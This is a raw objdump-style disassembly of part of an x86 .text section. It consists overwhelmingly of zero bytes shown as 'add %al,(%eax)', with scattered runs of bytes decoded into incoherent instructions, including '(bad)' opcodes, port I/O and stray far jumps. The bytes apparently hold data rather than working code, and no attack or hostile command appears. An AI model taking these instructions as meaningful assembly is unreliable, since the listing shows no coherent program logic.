                           .text:00401506 00 00                            add    %al,(%eax)
                           .text:00401508 00 00                            add    %al,(%eax)
                           .text:0040150a 00 00                            add    %al,(%eax)
                           .text:0040150c 00 00                            add    %al,(%eax)
                           .text:0040150e 00 00                            add    %al,(%eax)
                           .text:00401510 b6 ff                            mov    $0xff,%dh
                           .text:00401512 b7 15                            mov    $0x15,%bh
                           .text:00401514 4e                               dec    %esi
                           .text:00401515 bd f0 ab 30 c0                   mov    $0xc030abf0,%ebp
                           .text:0040151a 11 b5 bf 7f 00 00                adc    %esi,0x7fbf(%ebp)
                           .text:00401520 08 55 6d                         or     %dl,0x6d(%ebp)
                           .text:00401523 c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401529 00 00                            add    %al,(%eax)
                           .text:0040152b 00 00                            add    %al,(%eax)
                           .text:0040152d 00 00                            add    %al,(%eax)
                           .text:0040152f 00 00                            add    %al,(%eax)
                           .text:00401531 00 00                            add    %al,(%eax)
                           .text:00401533 00 00                            add    %al,(%eax)
                           .text:00401535 00 00                            add    %al,(%eax)
                           .text:00401537 00 00                            add    %al,(%eax)
                           .text:00401539 00 00                            add    %al,(%eax)
                           .text:0040153b 00 00                            add    %al,(%eax)
                           .text:0040153d 00 00                            add    %al,(%eax)
                           .text:0040153f 00 00                            add    %al,(%eax)
                           .text:00401541 00 00                            add    %al,(%eax)
                           .text:00401543 00 00                            add    %al,(%eax)
                           .text:00401545 00 00                            add    %al,(%eax)
                           .text:00401547 00 00                            add    %al,(%eax)
                           .text:00401549 00 00                            add    %al,(%eax)
                           .text:0040154b 00 00                            add    %al,(%eax)
                           .text:0040154d 00 00                            add    %al,(%eax)
                           .text:0040154f 00 00                            add    %al,(%eax)
                           .text:00401551 00 00                            add    %al,(%eax)
                           .text:00401553 00 00                            add    %al,(%eax)
                           .text:00401555 00 00                            add    %al,(%eax)
                           .text:00401557 00 00                            add    %al,(%eax)
                           .text:00401559 00 00                            add    %al,(%eax)
                           .text:0040155b 00 00                            add    %al,(%eax)
                           .text:0040155d 00 00                            add    %al,(%eax)
                           .text:0040155f 00 00                            add    %al,(%eax)
                           .text:00401561 00 00                            add    %al,(%eax)
                           .text:00401563 00 00                            add    %al,(%eax)
                           .text:00401565 00 00                            add    %al,(%eax)
                           .text:00401567 00 00                            add    %al,(%eax)
                           .text:00401569 00 00                            add    %al,(%eax)
                           .text:0040156b 00 00                            add    %al,(%eax)
                           .text:0040156d 00 00                            add    %al,(%eax)
                           .text:0040156f 00 00                            add    %al,(%eax)
                           .text:00401571 00 00                            add    %al,(%eax)
                           .text:00401573 00 00                            add    %al,(%eax)
                           .text:00401575 00 00                            add    %al,(%eax)
                           .text:00401577 00 00                            add    %al,(%eax)
                           .text:00401579 00 00                            add    %al,(%eax)
                           .text:0040157b 00 00                            add    %al,(%eax)
                           .text:0040157d 00 00                            add    %al,(%eax)
                           .text:0040157f 00 00                            add    %al,(%eax)
                           .text:00401581 00 00                            add    %al,(%eax)
                           .text:00401583 00 00                            add    %al,(%eax)
                           .text:00401585 00 00                            add    %al,(%eax)
                           .text:00401587 00 00                            add    %al,(%eax)
                           .text:00401589 00 00                            add    %al,(%eax)
                           .text:0040158b 00 00                            add    %al,(%eax)
                           .text:0040158d 00 00                            add    %al,(%eax)
                           .text:0040158f 00 00                            add    %al,(%eax)
                           .text:00401591 00 00                            add    %al,(%eax)
                           .text:00401593 00 00                            add    %al,(%eax)
                           .text:00401595 00 00                            add    %al,(%eax)
                           .text:00401597 00 00                            add    %al,(%eax)
                           .text:00401599 00 00                            add    %al,(%eax)
                           .text:0040159b 00 00                            add    %al,(%eax)
                           .text:0040159d 00 00                            add    %al,(%eax)
                           .text:0040159f 00 00                            add    %al,(%eax)
                           .text:004015a1 00 00                            add    %al,(%eax)
                           .text:004015a3 00 00                            add    %al,(%eax)
                           .text:004015a5 00 00                            add    %al,(%eax)
                           .text:004015a7 00 00                            add    %al,(%eax)
                           .text:004015a9 00 00                            add    %al,(%eax)
                           .text:004015ab 00 00                            add    %al,(%eax)
                           .text:004015ad 00 00                            add    %al,(%eax)
                           .text:004015af 00 00                            add    %al,(%eax)
                           .text:004015b1 00 00                            add    %al,(%eax)
                           .text:004015b3 00 00                            add    %al,(%eax)
                           .text:004015b5 00 00                            add    %al,(%eax)
                           .text:004015b7 00 00                            add    %al,(%eax)
                           .text:004015b9 00 00                            add    %al,(%eax)
                           .text:004015bb 00 00                            add    %al,(%eax)
                           .text:004015bd 00 00                            add    %al,(%eax)
                           .text:004015bf 00 00                            add    %al,(%eax)
                           .text:004015c1 00 00                            add    %al,(%eax)
                           .text:004015c3 00 00                            add    %al,(%eax)
                           .text:004015c5 00 00                            add    %al,(%eax)
                           .text:004015c7 00 00                            add    %al,(%eax)
                           .text:004015c9 00 00                            add    %al,(%eax)
                           .text:004015cb 00 00                            add    %al,(%eax)
                           .text:004015cd 00 00                            add    %al,(%eax)
                           .text:004015cf 00 00                            add    %al,(%eax)
                           .text:004015d1 00 00                            add    %al,(%eax)
                           .text:004015d3 00 00                            add    %al,(%eax)
                           .text:004015d5 00 00                            add    %al,(%eax)
                           .text:004015d7 00 00                            add    %al,(%eax)
                           .text:004015d9 00 00                            add    %al,(%eax)
                           .text:004015db 00 00                            add    %al,(%eax)
                           .text:004015dd 00 00                            add    %al,(%eax)
                           .text:004015df 00 00                            add    %al,(%eax)
                           .text:004015e1 00 00                            add    %al,(%eax)
                           .text:004015e3 00 00                            add    %al,(%eax)
                           .text:004015e5 00 00                            add    %al,(%eax)
                           .text:004015e7 00 00                            add    %al,(%eax)
                           .text:004015e9 00 00                            add    %al,(%eax)
                           .text:004015eb 00 00                            add    %al,(%eax)
                           .text:004015ed 00 00                            add    %al,(%eax)
                           .text:004015ef 00 00                            add    %al,(%eax)
                           .text:004015f1 00 00                            add    %al,(%eax)
                           .text:004015f3 00 00                            add    %al,(%eax)
                           .text:004015f5 00 00                            add    %al,(%eax)
                           .text:004015f7 00 00                            add    %al,(%eax)
                           .text:004015f9 00 00                            add    %al,(%eax)
                           .text:004015fb 00 00                            add    %al,(%eax)
                           .text:004015fd 00 00                            add    %al,(%eax)
                           .text:004015ff 00 00                            add    %al,(%eax)
                           .text:00401601 00 00                            add    %al,(%eax)
                           .text:00401603 00 00                            add    %al,(%eax)
                           .text:00401605 00 00                            add    %al,(%eax)
                           .text:00401607 00 00                            add    %al,(%eax)
                           .text:00401609 00 00                            add    %al,(%eax)
                           .text:0040160b 00 00                            add    %al,(%eax)
                           .text:0040160d 00 00                            add    %al,(%eax)
                           .text:0040160f 00 00                            add    %al,(%eax)
                           .text:00401611 00 00                            add    %al,(%eax)
                           .text:00401613 00 00                            add    %al,(%eax)
                           .text:00401615 00 00                            add    %al,(%eax)
                           .text:00401617 00 41 2d                         add    %al,0x2d(%ecx)
                           .text:0040161a 47                               inc    %edi
                           .text:0040161b 9e                               sahf   
                           .text:0040161c 9e                               sahf   
                           .text:0040161d e9 3f 43 d8 3e                   jmp    0x3f185961
                           .text:00401622 ef                               out    %eax,(%dx)
                           .text:00401623 b8 bf 7f 00 00                   mov    $0x7fbf,%eax
                           .text:00401628 60                               pusha  
                           .text:00401629 58                               pop    %eax
                           .text:0040162a 70 00                            jo     0x0040162c
                           .text:0040162c 00 00                            add    %al,(%eax)
                           .text:0040162e 00 00                            add    %al,(%eax)
                           .text:00401630 00 00                            add    %al,(%eax)
                           .text:00401632 00 00                            add    %al,(%eax)
                           .text:00401634 00 00                            add    %al,(%eax)
                           .text:00401636 00 00                            add    %al,(%eax)
                           .text:00401638 00 00                            add    %al,(%eax)
                           .text:0040163a 00 00                            add    %al,(%eax)
                           .text:0040163c 00 00                            add    %al,(%eax)
                           .text:0040163e 00 00                            add    %al,(%eax)
                           .text:00401640 00 00                            add    %al,(%eax)
                           .text:00401642 00 00                            add    %al,(%eax)
                           .text:00401644 00 00                            add    %al,(%eax)
                           .text:00401646 00 00                            add    %al,(%eax)
                           .text:00401648 00 00                            add    %al,(%eax)
                           .text:0040164a 00 00                            add    %al,(%eax)
                           .text:0040164c 00 00                            add    %al,(%eax)
                           .text:0040164e 00 00                            add    %al,(%eax)
                           .text:00401650 00 00                            add    %al,(%eax)
                           .text:00401652 00 00                            add    %al,(%eax)
                           .text:00401654 00 00                            add    %al,(%eax)
                           .text:00401656 00 00                            add    %al,(%eax)
                           .text:00401658 00 00                            add    %al,(%eax)
                           .text:0040165a 00 00                            add    %al,(%eax)
                           .text:0040165c 00 00                            add    %al,(%eax)
                           .text:0040165e 00 00                            add    %al,(%eax)
                           .text:00401660 00 00                            add    %al,(%eax)
                           .text:00401662 00 00                            add    %al,(%eax)
                           .text:00401664 00 00                            add    %al,(%eax)
                           .text:00401666 00 00                            add    %al,(%eax)
                           .text:00401668 00 00                            add    %al,(%eax)
                           .text:0040166a 00 00                            add    %al,(%eax)
                           .text:0040166c 00 00                            add    %al,(%eax)
                           .text:0040166e 00 00                            add    %al,(%eax)
                           .text:00401670 00 00                            add    %al,(%eax)
                           .text:00401672 00 00                            add    %al,(%eax)
                           .text:00401674 00 00                            add    %al,(%eax)
                           .text:00401676 00 00                            add    %al,(%eax)
                           .text:00401678 00 00                            add    %al,(%eax)
                           .text:0040167a 00 00                            add    %al,(%eax)
                           .text:0040167c 00 00                            add    %al,(%eax)
                           .text:0040167e 00 00                            add    %al,(%eax)
                           .text:00401680 00 00                            add    %al,(%eax)
                           .text:00401682 00 00                            add    %al,(%eax)
                           .text:00401684 00 00                            add    %al,(%eax)
                           .text:00401686 00 00                            add    %al,(%eax)
                           .text:00401688 00 00                            add    %al,(%eax)
                           .text:0040168a 00 00                            add    %al,(%eax)
                           .text:0040168c 00 00                            add    %al,(%eax)
                           .text:0040168e 00 00                            add    %al,(%eax)
                           .text:00401690 46                               inc    %esi
                           .text:00401691 b1 34                            mov    $0x34,%cl
                           .text:00401693 ec                               in     (%dx),%al
                           .text:00401694 83 00 cf                         addl   $0xffffffcf,(%eax)
                           .text:00401697 30 b0 c4 11 b5 bf                xor    %dh,-0x404aee3c(%eax)
                           .text:0040169d 7f 00                            jg     0x0040169f
                           .text:0040169f 00 b0 58 70 00 00                add    %dh,0x7058(%eax)
                           .text:004016a5 00 00                            add    %al,(%eax)
                           .text:004016a7 00 00                            add    %al,(%eax)
                           .text:004016a9 00 00                            add    %al,(%eax)
                           .text:004016ab 00 00                            add    %al,(%eax)
                           .text:004016ad 00 00                            add    %al,(%eax)
                           .text:004016af 00 00                            add    %al,(%eax)
                           .text:004016b1 00 00                            add    %al,(%eax)
                           .text:004016b3 00 00                            add    %al,(%eax)
                           .text:004016b5 00 00                            add    %al,(%eax)
                           .text:004016b7 00 00                            add    %al,(%eax)
                           .text:004016b9 00 00                            add    %al,(%eax)
                           .text:004016bb 00 00                            add    %al,(%eax)
                           .text:004016bd 00 00                            add    %al,(%eax)
                           .text:004016bf 00 00                            add    %al,(%eax)
                           .text:004016c1 00 00                            add    %al,(%eax)
                           .text:004016c3 00 00                            add    %al,(%eax)
                           .text:004016c5 00 00                            add    %al,(%eax)
                           .text:004016c7 00 00                            add    %al,(%eax)
                           .text:004016c9 00 00                            add    %al,(%eax)
                           .text:004016cb 00 00                            add    %al,(%eax)
                           .text:004016cd 00 00                            add    %al,(%eax)
                           .text:004016cf 00 00                            add    %al,(%eax)
                           .text:004016d1 00 00                            add    %al,(%eax)
                           .text:004016d3 00 00                            add    %al,(%eax)
                           .text:004016d5 00 00                            add    %al,(%eax)
                           .text:004016d7 00 00                            add    %al,(%eax)
                           .text:004016d9 00 00                            add    %al,(%eax)
                           .text:004016db 00 00                            add    %al,(%eax)
                           .text:004016dd 00 00                            add    %al,(%eax)
                           .text:004016df 00 00                            add    %al,(%eax)
                           .text:004016e1 00 00                            add    %al,(%eax)
                           .text:004016e3 00 00                            add    %al,(%eax)
                           .text:004016e5 00 00                            add    %al,(%eax)
                           .text:004016e7 00 00                            add    %al,(%eax)
                           .text:004016e9 00 00                            add    %al,(%eax)
                           .text:004016eb 00 00                            add    %al,(%eax)
                           .text:004016ed 00 00                            add    %al,(%eax)
                           .text:004016ef 00 00                            add    %al,(%eax)
                           .text:004016f1 00 00                            add    %al,(%eax)
                           .text:004016f3 00 00                            add    %al,(%eax)
                           .text:004016f5 00 00                            add    %al,(%eax)
                           .text:004016f7 00 00                            add    %al,(%eax)
                           .text:004016f9 00 00                            add    %al,(%eax)
                           .text:004016fb 00 00                            add    %al,(%eax)
                           .text:004016fd 00 00                            add    %al,(%eax)
                           .text:004016ff 00 00                            add    %al,(%eax)
                           .text:00401701 00 00                            add    %al,(%eax)
                           .text:00401703 00 00                            add    %al,(%eax)
                           .text:00401705 00 00                            add    %al,(%eax)
                           .text:00401707 00 00                            add    %al,(%eax)
                           .text:00401709 00 00                            add    %al,(%eax)
                           .text:0040170b 00 00                            add    %al,(%eax)
                           .text:0040170d 00 00                            add    %al,(%eax)
                           .text:0040170f 00 00                            add    %al,(%eax)
                           .text:00401711 00 00                            add    %al,(%eax)
                           .text:00401713 00 00                            add    %al,(%eax)
                           .text:00401715 00 00                            add    %al,(%eax)
                           .text:00401717 00 00                            add    %al,(%eax)
                           .text:00401719 00 00                            add    %al,(%eax)
                           .text:0040171b 00 00                            add    %al,(%eax)
                           .text:0040171d 00 00                            add    %al,(%eax)
                           .text:0040171f 00 00                            add    %al,(%eax)
                           .text:00401721 00 00                            add    %al,(%eax)
                           .text:00401723 00 00                            add    %al,(%eax)
                           .text:00401725 00 00                            add    %al,(%eax)
                           .text:00401727 00 00                            add    %al,(%eax)
                           .text:00401729 00 00                            add    %al,(%eax)
                           .text:0040172b 00 00                            add    %al,(%eax)
                           .text:0040172d 00 00                            add    %al,(%eax)
                           .text:0040172f 00 00                            add    %al,(%eax)
                           .text:00401731 00 00                            add    %al,(%eax)
                           .text:00401733 00 00                            add    %al,(%eax)
                           .text:00401735 00 00                            add    %al,(%eax)
                           .text:00401737 00 00                            add    %al,(%eax)
                           .text:00401739 00 00                            add    %al,(%eax)
                           .text:0040173b 00 00                            add    %al,(%eax)
                           .text:0040173d 00 00                            add    %al,(%eax)
                           .text:0040173f 00 00                            add    %al,(%eax)
                           .text:00401741 00 00                            add    %al,(%eax)
                           .text:00401743 00 00                            add    %al,(%eax)
                           .text:00401745 00 00                            add    %al,(%eax)
                           .text:00401747 00 00                            add    %al,(%eax)
                           .text:00401749 00 00                            add    %al,(%eax)
                           .text:0040174b 00 00                            add    %al,(%eax)
                           .text:0040174d 00 00                            add    %al,(%eax)
                           .text:0040174f 00 00                            add    %al,(%eax)
                           .text:00401751 00 00                            add    %al,(%eax)
                           .text:00401753 00 00                            add    %al,(%eax)
                           .text:00401755 00 00                            add    %al,(%eax)
                           .text:00401757 00 00                            add    %al,(%eax)
                           .text:00401759 00 00                            add    %al,(%eax)
                           .text:0040175b 00 00                            add    %al,(%eax)
                           .text:0040175d 00 00                            add    %al,(%eax)
                           .text:0040175f 00 00                            add    %al,(%eax)
                           .text:00401761 00 00                            add    %al,(%eax)
                           .text:00401763 00 00                            add    %al,(%eax)
                           .text:00401765 00 00                            add    %al,(%eax)
                           .text:00401767 00 00                            add    %al,(%eax)
                           .text:00401769 00 00                            add    %al,(%eax)
                           .text:0040176b 00 00                            add    %al,(%eax)
                           .text:0040176d 00 00                            add    %al,(%eax)
                           .text:0040176f 00 00                            add    %al,(%eax)
                           .text:00401771 00 00                            add    %al,(%eax)
                           .text:00401773 00 00                            add    %al,(%eax)
                           .text:00401775 00 00                            add    %al,(%eax)
                           .text:00401777 00 00                            add    %al,(%eax)
                           .text:00401779 00 00                            add    %al,(%eax)
                           .text:0040177b 00 00                            add    %al,(%eax)
                           .text:0040177d 00 00                            add    %al,(%eax)
                           .text:0040177f 00 50 e8                         add    %dl,-0x18(%eax)
                           .text:00401782 a8 25                            test   $0x25,%al
                           .text:00401784 8f                               (bad)  
                           .text:00401785 f3 5d                            repz pop %ebp
                           .text:00401787 53                               push   %ebx
                           .text:00401788 70 c8                            jo     0x00401752
                           .text:0040178a 11 b5 bf 7f 00 00                adc    %esi,0x7fbf(%ebp)
                           .text:00401790 80 58 70 00                      sbbb   $0x0,0x70(%eax)
                           .text:00401794 00 00                            add    %al,(%eax)
                           .text:00401796 00 00                            add    %al,(%eax)
                           .text:00401798 00 00                            add    %al,(%eax)
                           .text:0040179a 00 00                            add    %al,(%eax)
                           .text:0040179c 00 00                            add    %al,(%eax)
                           .text:0040179e 00 00                            add    %al,(%eax)
                           .text:004017a0 00 00                            add    %al,(%eax)
                           .text:004017a2 00 00                            add    %al,(%eax)
                           .text:004017a4 00 00                            add    %al,(%eax)
                           .text:004017a6 00 00                            add    %al,(%eax)
                           .text:004017a8 00 00                            add    %al,(%eax)
                           .text:004017aa 00 00                            add    %al,(%eax)
                           .text:004017ac 00 00                            add    %al,(%eax)
                           .text:004017ae 00 00                            add    %al,(%eax)
                           .text:004017b0 00 00                            add    %al,(%eax)
                           .text:004017b2 00 00                            add    %al,(%eax)
                           .text:004017b4 00 00                            add    %al,(%eax)
                           .text:004017b6 00 00                            add    %al,(%eax)
                           .text:004017b8 00 00                            add    %al,(%eax)
                           .text:004017ba 00 00                            add    %al,(%eax)
                           .text:004017bc 00 00                            add    %al,(%eax)
                           .text:004017be 00 00                            add    %al,(%eax)
                           .text:004017c0 00 00                            add    %al,(%eax)
                           .text:004017c2 00 00                            add    %al,(%eax)
                           .text:004017c4 00 00                            add    %al,(%eax)
                           .text:004017c6 00 00                            add    %al,(%eax)
                           .text:004017c8 d3 88 a6 73 f8 10                rorl   %cl,0x10f873a6(%eax)
                           .text:004017ce 10 46 10                         adc    %al,0x10(%esi)
                           .text:004017d1 c8 11 b5 bf                      enter  $0xb511,$0xbf
                           .text:004017d5 7f 00                            jg     0x004017d7
                           .text:004017d7 00 b0 58 70 00 00                add    %dh,0x7058(%eax)
                           .text:004017dd 00 00                            add    %al,(%eax)
                           .text:004017df 00 00                            add    %al,(%eax)
                           .text:004017e1 00 00                            add    %al,(%eax)
                           .text:004017e3 00 00                            add    %al,(%eax)
                           .text:004017e5 00 00                            add    %al,(%eax)
                           .text:004017e7 00 00                            add    %al,(%eax)
                           .text:004017e9 00 00                            add    %al,(%eax)
                           .text:004017eb 00 00                            add    %al,(%eax)
                           .text:004017ed 00 00                            add    %al,(%eax)
                           .text:004017ef 00 00                            add    %al,(%eax)
                           .text:004017f1 00 00                            add    %al,(%eax)
                           .text:004017f3 00 00                            add    %al,(%eax)
                           .text:004017f5 00 00                            add    %al,(%eax)
                           .text:004017f7 00 55 27                         add    %dl,0x27(%ebp)
                           .text:004017fa b1 76                            mov    $0x76,%cl
                           .text:004017fc 2a f8                            sub    %al,%bh
                           .text:004017fe 61                               popa   
                           .text:004017ff df 80 3f ef b8 bf                fild   -0x404710c1(%eax)
                           .text:00401805 7f 00                            jg     0x00401807
                           .text:00401807 00 08                            add    %cl,(%eax)
                           .text:00401809 55                               push   %ebp
                           .text:0040180a 6d                               insl   (%dx),%es:(%edi)
                           .text:0040180b c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401811 00 00                            add    %al,(%eax)
                           .text:00401813 00 00                            add    %al,(%eax)
                           .text:00401815 00 00                            add    %al,(%eax)
                           .text:00401817 00 00                            add    %al,(%eax)
                           .text:00401819 00 00                            add    %al,(%eax)
                           .text:0040181b 00 00                            add    %al,(%eax)
                           .text:0040181d 00 00                            add    %al,(%eax)
                           .text:0040181f 00 00                            add    %al,(%eax)
                           .text:00401821 00 00                            add    %al,(%eax)
                           .text:00401823 00 00                            add    %al,(%eax)
                           .text:00401825 00 00                            add    %al,(%eax)
                           .text:00401827 00 d7                            add    %dl,%bh
                           .text:00401829 be a7 51 6b b7                   mov    $0xb76b51a7,%esi
                           .text:0040182e 9b                               fwait
                           .text:0040182f 56                               push   %esi
                           .text:00401830 00 ac 8b b4 bf 7f 00             add    %ch,0x7fbfb4(%ebx,%ecx,4)
                           .text:00401837 00 b0 20 3d b4 bf                add    %dh,-0x404bc2e0(%eax)
                           .text:0040183d 7f 00                            jg     0x0040183f
                           .text:0040183f 00 00                            add    %al,(%eax)
                           .text:00401841 00 00                            add    %al,(%eax)
                           .text:00401843 00 00                            add    %al,(%eax)
                           .text:00401845 00 00                            add    %al,(%eax)
                           .text:00401847 00 00                            add    %al,(%eax)
                           .text:00401849 00 00                            add    %al,(%eax)
                           .text:0040184b 00 00                            add    %al,(%eax)
                           .text:0040184d 00 00                            add    %al,(%eax)
                           .text:0040184f 00 00                            add    %al,(%eax)
                           .text:00401851 00 00                            add    %al,(%eax)
                           .text:00401853 00 00                            add    %al,(%eax)
                           .text:00401855 00 00                            add    %al,(%eax)
                           .text:00401857 00 00                            add    %al,(%eax)
                           .text:00401859 00 00                            add    %al,(%eax)
                           .text:0040185b 00 00                            add    %al,(%eax)
                           .text:0040185d 00 00                            add    %al,(%eax)
                           .text:0040185f 00 00                            add    %al,(%eax)
                           .text:00401861 00 00                            add    %al,(%eax)
                           .text:00401863 00 00                            add    %al,(%eax)
                           .text:00401865 00 00                            add    %al,(%eax)
                           .text:00401867 00 00                            add    %al,(%eax)
                           .text:00401869 00 00                            add    %al,(%eax)
                           .text:0040186b 00 00                            add    %al,(%eax)
                           .text:0040186d 00 00                            add    %al,(%eax)
                           .text:0040186f 00 00                            add    %al,(%eax)
                           .text:00401871 00 00                            add    %al,(%eax)
                           .text:00401873 00 00                            add    %al,(%eax)
                           .text:00401875 00 00                            add    %al,(%eax)
                           .text:00401877 00 00                            add    %al,(%eax)
                           .text:00401879 00 00                            add    %al,(%eax)
                           .text:0040187b 00 00                            add    %al,(%eax)
                           .text:0040187d 00 00                            add    %al,(%eax)
                           .text:0040187f 00 00                            add    %al,(%eax)
                           .text:00401881 00 00                            add    %al,(%eax)
                           .text:00401883 00 00                            add    %al,(%eax)
                           .text:00401885 00 00                            add    %al,(%eax)
                           .text:00401887 00 5b 7f                         add    %bl,0x7f(%ebx)
                           .text:0040188a ea 4c 6b 75 32 a2 b8             ljmp   $0xb8a2,$0x32756b4c
                           .text:00401891 3f                               aas    
                           .text:00401892 ef                               out    %eax,(%dx)
                           .text:00401893 b8 bf 7f 00 00                   mov    $0x7fbf,%eax
                           .text:00401898 08 55 6d                         or     %dl,0x6d(%ebp)
                           .text:0040189b c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:004018a1 00 00                            add    %al,(%eax)
                           .text:004018a3 00 00                            add    %al,(%eax)
                           .text:004018a5 00 00                            add    %al,(%eax)
                           .text:004018a7 00 00                            add    %al,(%eax)
                           .text:004018a9 00 00                            add    %al,(%eax)
                           .text:004018ab 00 00                            add    %al,(%eax)
                           .text:004018ad 00 00                            add    %al,(%eax)
                           .text:004018af 00 00                            add    %al,(%eax)
                           .text:004018b1 00 00                            add    %al,(%eax)
                           .text:004018b3 00 00                            add    %al,(%eax)
                           .text:004018b5 00 00                            add    %al,(%eax)
                           .text:004018b7 00 dd                            add    %bl,%ch
                           .text:004018b9 14 de                            adc    $0xde,%al
                           .text:004018bb 7f 8a                            jg     0x00401847
                           .text:004018bd b5 b0                            mov    $0xb0,%ch
                           .text:004018bf 69 80 61 ca b4 bf 7f 00 00 80    imul   $0x8000007f,-0x404b359f(%eax),%eax
                           .text:004018c9 58                               pop    %eax
                           .text:004018ca 70 00                            jo     0x004018cc
                           .text:004018cc 00 00                            add    %al,(%eax)
                           .text:004018ce 00 00                            add    %al,(%eax)
                           .text:004018d0 00 00                            add    %al,(%eax)
                           .text:004018d2 00 00                            add    %al,(%eax)
                           .text:004018d4 00 00                            add    %al,(%eax)
                           .text:004018d6 00 00                            add    %al,(%eax)
                           .text:004018d8 00 00                            add    %al,(%eax)
                           .text:004018da 00 00                            add    %al,(%eax)
                           .text:004018dc 00 00                            add    %al,(%eax)
                           .text:004018de 00 00                            add    %al,(%eax)
                           .text:004018e0 00 00                            add    %al,(%eax)
                           .text:004018e2 00 00                            add    %al,(%eax)
                           .text:004018e4 00 00                            add    %al,(%eax)
                           .text:004018e6 00 00                            add    %al,(%eax)
                           .text:004018e8 00 00                            add    %al,(%eax)
                           .text:004018ea 00 00                            add    %al,(%eax)
                           .text:004018ec 00 00                            add    %al,(%eax)
                           .text:004018ee 00 00                            add    %al,(%eax)
                           .text:004018f0 00 00                            add    %al,(%eax)
                           .text:004018f2 00 00                            add    %al,(%eax)
                           .text:004018f4 00 00                            add    %al,(%eax)
                           .text:004018f6 00 00                            add    %al,(%eax)
                           .text:004018f8 00 00                            add    %al,(%eax)
                           .text:004018fa 00 00                            add    %al,(%eax)
                           .text:004018fc 00 00                            add    %al,(%eax)
                           .text:004018fe 00 00                            add    %al,(%eax)
                           .text:00401900 00 00                            add    %al,(%eax)
                           .text:00401902 00 00                            add    %al,(%eax)
                           .text:00401904 00 00                            add    %al,(%eax)
                           .text:00401906 00 00                            add    %al,(%eax)
                           .text:00401908 00 00                            add    %al,(%eax)
                           .text:0040190a 00 00                            add    %al,(%eax)
                           .text:0040190c 00 00                            add    %al,(%eax)
                           .text:0040190e 00 00                            add    %al,(%eax)
                           .text:00401910 00 00                            add    %al,(%eax)
                           .text:00401912 00 00                            add    %al,(%eax)
                           .text:00401914 00 00                            add    %al,(%eax)
                           .text:00401916 00 00                            add    %al,(%eax)
                           .text:00401918 00 00                            add    %al,(%eax)
                           .text:0040191a 00 00                            add    %al,(%eax)
                           .text:0040191c 00 00                            add    %al,(%eax)
                           .text:0040191e 00 00                            add    %al,(%eax)
                           .text:00401920 00 00                            add    %al,(%eax)
                           .text:00401922 00 00                            add    %al,(%eax)
                           .text:00401924 00 00                            add    %al,(%eax)
                           .text:00401926 00 00                            add    %al,(%eax)
                           .text:00401928 00 00                            add    %al,(%eax)
                           .text:0040192a 00 00                            add    %al,(%eax)
                           .text:0040192c 00 00                            add    %al,(%eax)
                           .text:0040192e 00 00                            add    %al,(%eax)
                           .text:00401930 00 00                            add    %al,(%eax)
                           .text:00401932 00 00                            add    %al,(%eax)
                           .text:00401934 00 00                            add    %al,(%eax)
                           .text:00401936 00 00                            add    %al,(%eax)
                           .text:00401938 00 00                            add    %al,(%eax)
                           .text:0040193a 00 00                            add    %al,(%eax)
                           .text:0040193c 00 00                            add    %al,(%eax)
                           .text:0040193e 00 00                            add    %al,(%eax)
                           .text:00401940 00 00                            add    %al,(%eax)
                           .text:00401942 00 00                            add    %al,(%eax)
                           .text:00401944 00 00                            add    %al,(%eax)
                           .text:00401946 00 00                            add    %al,(%eax)
                           .text:00401948 00 00                            add    %al,(%eax)
                           .text:0040194a 00 00                            add    %al,(%eax)
                           .text:0040194c 00 00                            add    %al,(%eax)
                           .text:0040194e 00 00                            add    %al,(%eax)
                           .text:00401950 00 00                            add    %al,(%eax)
                           .text:00401952 00 00                            add    %al,(%eax)
                           .text:00401954 00 00                            add    %al,(%eax)
                           .text:00401956 00 00                            add    %al,(%eax)
                           .text:00401958 00 00                            add    %al,(%eax)
                           .text:0040195a 00 00                            add    %al,(%eax)
                           .text:0040195c 00 00                            add    %al,(%eax)
                           .text:0040195e 00 00                            add    %al,(%eax)
                           .text:00401960 00 00                            add    %al,(%eax)
                           .text:00401962 00 00                            add    %al,(%eax)
                           .text:00401964 00 00                            add    %al,(%eax)
                           .text:00401966 00 00                            add    %al,(%eax)
                           .text:00401968 00 00                            add    %al,(%eax)
                           .text:0040196a 00 00                            add    %al,(%eax)
                           .text:0040196c 00 00                            add    %al,(%eax)
                           .text:0040196e 00 00                            add    %al,(%eax)
                           .text:00401970 00 00                            add    %al,(%eax)
                           .text:00401972 00 00                            add    %al,(%eax)
                           .text:00401974 00 00                            add    %al,(%eax)
                           .text:00401976 00 00                            add    %al,(%eax)
                           .text:00401978 00 00                            add    %al,(%eax)
                           .text:0040197a 00 00                            add    %al,(%eax)
                           .text:0040197c 00 00                            add    %al,(%eax)
                           .text:0040197e 00 00                            add    %al,(%eax)
                           .text:00401980 00 00                            add    %al,(%eax)
                           .text:00401982 00 00                            add    %al,(%eax)
                           .text:00401984 00 00                            add    %al,(%eax)
                           .text:00401986 00 00                            add    %al,(%eax)
                           .text:00401988 00 00                            add    %al,(%eax)
                           .text:0040198a 00 00                            add    %al,(%eax)
                           .text:0040198c 00 00                            add    %al,(%eax)
                           .text:0040198e 00 00                            add    %al,(%eax)
                           .text:00401990 e6 a5                            out    %al,$0xa5
                           .text:00401992 dd 69 d2                         (bad)  -0x2e(%ecx)
                           .text:00401995 a3 8a 8a 20 61                   mov    %eax,0x61208a8a
                           .text:0040199a ca b4 bf                         lret   $0xbfb4
                           .text:0040199d 7f 00                            jg     0x0040199f
                           .text:0040199f 00 d0                            add    %dl,%al
                           .text:004019a1 e5 37                            in     $0x37,%eax
                           .text:004019a3 b5 bf                            mov    $0xbf,%ch
                           .text:004019a5 7f 00                            jg     0x004019a7
                           .text:004019a7 00 e7                            add    %ah,%bh
                           .text:004019a9 32 3a                            xor    (%edx),%bh
                           .text:004019ab 79 02                            jns    0x004019af
                           .text:004019ad 5c                               pop    %esp
                           .text:004019ae 9f                               lahf   
                           .text:004019af 8a 00                            mov    (%eax),%al
                           .text:004019b1 6c                               insb   (%dx),%es:(%edi)
                           .text:004019b2 ca b4 bf                         lret   $0xbfb4
                           .text:004019b5 7f 00                            jg     0x004019b7
                           .text:004019b7 00 08                            add    %cl,(%eax)
                           .text:004019b9 55                               push   %ebp
                           .text:004019ba 6d                               insl   (%dx),%es:(%edi)
                           .text:004019bb c5 bf 7f 00 00 68                lds    0x6800007f(%edi),%edi
                           .text:004019c1 19 74 74 a6                      sbb    %esi,-0x5a(%esp,%esi,2)
                           .text:004019c5 1b 75 71                         sbb    0x71(%ebp),%esi
